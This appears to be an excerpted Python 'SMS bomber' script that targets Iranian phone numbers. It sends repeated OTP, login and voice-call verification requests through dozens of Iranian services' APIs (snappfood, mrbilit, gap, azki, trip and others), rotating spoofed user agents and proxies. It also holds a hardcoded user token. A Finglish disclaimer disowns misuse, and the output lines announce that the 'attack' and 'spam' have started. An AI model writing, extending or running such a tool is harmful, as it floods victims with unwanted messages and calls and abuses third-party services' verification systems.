...
def torob(num, proxies):
    get( url=f'https://api.torob.com/a/phone/send-pin/?phone_number=0{num}',
...
def miareh(num, proxies): get( url=f'https://www.miare.ir/p/restaurant/#/login?phone=0{num}',)

def ostadkar(num, proxies): post( url="https://api.ostadkr.com/login",json={"mobile": f'0{num}'},)
...
def gap(num, proxies):
    get( url=f'https://core.gap.im/v1/user/add.json?mobile=%2B98{num}')
...
def mrbilit(num, proxies): get( url=f'https://auth.mrbilit.com/api/login/exists/v2?mobileOrEmail=0{num}&source=2&sendTokenIfNot=true')
...
def snappfood(num, proxies):
    post( url="https://snappfood.ir/mobile/v2/user/loginMobileWithNoPass?lat=35.774&long=51.418&sms_apialClient=WEBSITE&client=WEBSITE&deviceType=WEBSITE&appVersion=8.1.0&UDID=39c62f64-3d2d-4954-9033-816098559ae4&locale=fa",
...
def okcs(num, proxies):
    ...
    get( url="https://okcs.com/users/mobilelogin?mobile=0" + num, headers=rhead)
...
def pubgsell(num, proxies):
        rhead = {"user-agent": generate_user_agent()}
        post( url=f"https://pubg-sell.ir/loginuser?username=0{num}", headers=rhead)
...
def pirankalaco(num, proxies):
    ...
    post( url="https://pirankalaco.ir/shop/SendPhone.php",data=f"phone=0{num}",headers=head)
...
def tnovin(num, proxies):
    ...
    post( url="http://shop.tnovin.com/login",data=f"phone=0{num}",headers=head)
...
def bitex24(num, proxies):
    ...
    get( url=f"https://bitex24.com/api/v1/auth/sendSms?mobile=0{num}&dial_code=0", headers=HEADER)
...
def mrbilitcall(num, proxies):
    get( url=f'https://auth.mrbilit.com/api/Token/send/byCall?mobile=0{num}',
    )    
...
def gap(num, proxies):
    get( url=f'https://core.gap.im/v1/user/resendCode.json?mobile=%2B98{num}&type=IVR')



def novinbook(num, proxies):
    post( url="https://novinbook.com/index.php?route=account/phone",data=f"phone=0{num}&call=yes",headers={'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '26','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','cookie': 'language=fa; currency=RLS','origin': 'https://novinbook.com','referer': 'https://novinbook.com/index.php?route=account/phone','sec-ch-ua': '"Google Chrome";v="105"'', "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': generate_user_agent(os="win"),'x-requested-with': 'XMLHttpRequest'})



def azki(num, proxies):
    get( url=f"https://www.azki.com/api/vehicleorder/api/customer/register/login-with-vocal-verification-code?phoneNumber=0{num}", headers={'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','device': 'web','deviceid': '6','referer': 'https://www.azki.com/','sec-ch-ua': '"Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': generate_user_agent(os="win"),'user-name': 'null','user-token': '2ub07qJQnuG7w1NtXMifm1JeKnKSJzBKnIosaF0FnM8mVfwWAAV4Ae9cMu3JxskL'})
...
def trip(num, proxies):
    ...
    post( url="https://gateway.trip.ir/api/registers", headers=rhead, json={"CellPhone":"0"+num})
    post( url="https://gateway.trip.ir/api/Totp", headers=rhead, json={"PhoneNumber": "0"+num})
...
print("""
Barye istfade az in baname ghavnin ra motalea befarmaiid

1 . Sazande Hich Masoolayti Dar Ghbal Soea Estfade Nadard

2 . Forosh In Mahsol Ghayere Ghanoni Mibashd

‎ ‎ ‎ ‎ Ba Vard Kardan Goozine [( Y )] Ghavanin Ra Mipazirid
""")
...
if A == "y" or A == "Y":
    ...
    print('_-==== Hamle Shoroe Shod ====-_')
    print('_-==== Spamed Ba Big Bang Boomber ====-_')
    print('_-==== Developed & Desine Ba ParsaYavari ====-_')
